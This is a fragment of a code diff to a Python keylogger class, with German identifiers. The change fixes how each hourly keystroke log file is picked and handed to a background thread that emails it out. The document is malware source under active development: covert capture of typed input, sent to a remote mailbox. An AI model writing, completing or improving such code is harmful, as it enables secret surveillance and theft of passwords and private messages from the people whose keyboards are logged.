@@ -17,15 +17,13 @@ class keylogger_class:
         now = datetime.now()
         new_filename = now.strftime("%Y%m%d%H") + ".log"      # zeitabstände
         old_filename = new_filename
-        datei_sende_name=new_filename
         handle = open(log_destination + new_filename, "w")
 
         def send_email():
             global send_go
-            #global datei_sende_name
             while True:
                 if send_go==1:
-                    init_email.email_sender_funk(log_destination,datei_sende_name)
+                    init_email.email_sender_funk(log_destination,sendme)
                     send_go=0
 
         email_thread=Thread(target=send_email)
@@ -47,9 +45,12 @@ class keylogger_class:
             # check and open new file
             zeahler=0
             if old_filename != new_filename:
+                global sendme
+                sendme=old_filename
                 handle.close()
                 handle = open(log_destination + new_filename, "w")
                 old_filename = new_filename
+
                 if zeahler == 0:
                     send_go=1
                     zeahler=1
